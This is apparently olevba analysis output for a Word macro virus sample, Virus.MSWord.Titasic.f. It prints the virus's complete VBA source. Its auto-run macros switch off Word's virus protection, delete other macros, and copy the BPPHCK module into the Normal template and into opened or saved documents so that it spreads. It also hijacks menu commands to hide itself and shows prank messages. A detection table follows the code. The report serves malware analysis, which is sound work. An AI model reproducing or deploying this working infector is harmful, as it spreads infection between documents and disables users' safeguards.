olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Titasic.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Titasic.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO BPPHCK.bas 
in file: Virus.MSWord.Titasic.f - OLE stream: 'Macros/VBA/BPPHCK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' ##### Innama a'malu binniyat #####
' Saya hanya berusaha melindungi komputerku, dan tentu juga komputer-
' teman-teman dari terinfeksinya virus macro yang merugikan.
' Semoga Allah melindungi kita semua
Sub ShowMessage()
    H = Time
    If ((Date) = vb Or (Date) = vb) And Time < TimeValue("21:00:00") Then
    For i = 1 To 100
        Beep
    Next i
    H = MsgBox("Terimakasih buat teman ku jos yang amat sangat " & Chr(34) & _
    "bijaksana" & Chr(34) & "," & Chr(13) & "yang telah memberiku nasehat-nasehat JELEK. Saya merasa bangga " & Chr(13) & _
    "dan sungguh-sungguh bangga terhadap temanku itu." & Chr(13) & _
    "terimakasih ya.... JOS di DEPOK!." & Chr(13) & Chr(13) & "Semoga mereka tetap di U I D." & _
    Chr(13) & "(buat teman-teman, ma'af ya mengganggu EMON .)", vbOKOnly + vbExclamation, "Ucapan Terimakasih")
    End If
End Sub

Sub Bablas()
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
End Sub

Sub ToolsMacro()
    H = MsgBox("Eh.... Elu jangan coba-coba ganggu gua ye........", vbExclamation + vbOKOnly)
End Sub

Sub ViewVbCode()
    ToolsMacro
End Sub

Sub FileTemplates()
    ToolsMacro
End Sub

Sub HelpAbout()
    H = MsgBox("Qun katawon walataqun kalaler." & Chr(13) & Chr(13) & _
    "I LOVE SOMETHING ERROR !", vbOKOnly + vbExclamation, "Bpp Hacker")
End Sub

Sub ToolsOptions()
    Options.SaveNormalPrompt = True
    Options.SavePropertiesPrompt = True
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    Bablas
End Sub

Sub ChangeCap()
    On Error Resume Next
End Sub

Sub RestoreCap()
    On Error Resume Next
    Application.Caption = "Microsoft Word"
    ActiveWindow.Caption = ActiveDocument.Name
End Sub

Sub OpenMyMacro()
    If InputBox("Enter password", "Bpp Hacker") = "azizoke" Then Application.ShowVisualBasicEditor = True
End Sub

Sub SikatDocument()
    Dim DocOk As Boolean
    DocOk = False
    
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "BPPHCK" Then DocOk = True
        If Obj.Name <> "BPPHCK" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in " + ActiveDocument.Name + "..."
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If DocOk = False Then
        Application.StatusBar = "Copying Bpp Hacker From Normal Template to " _
        + ActiveDocument.Name + "..."
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="BPPHCK", Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub SikatTemplate()
    Dim NorOk As Boolean
    NorOk = False
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "BPPHCK" Then NorOk = True
        If Obj.Name <> "BPPHCK" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in Normal Template..."
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If NorOk = False Then
        Application.StatusBar = "Copying Bpp Hacker From " + ActiveDocument.Name + _
        " to Normal Template..."
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="BPPHCK", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
End Sub

Sub AutoExit()
    ShowMessage
    Application.Quit
End Sub

Sub FileOpen()
    ChangeCap
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        SikatDocument
        ActiveDocument.Save
    End If
    RestoreCap
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoOpen()
    Bablas
    ChangeCap
    SikatTemplate
    On Error Resume Next
    RestoreCap
End Sub

Sub AutoClose()
    SikatDocument
End Sub

Sub FileClose()
    AutoClose
End Sub

Sub FileSave()
    If ActiveDocument.Saved = False Then
        SikatDocument
        SikatTemplate
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub

Sub AutoExec()
    WordBasic.DisableAutoMacros True
    Bablas
    Application.OnTime Now + TimeValue("00:00:07"), "Normal.BPPHCK.Ancurin"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

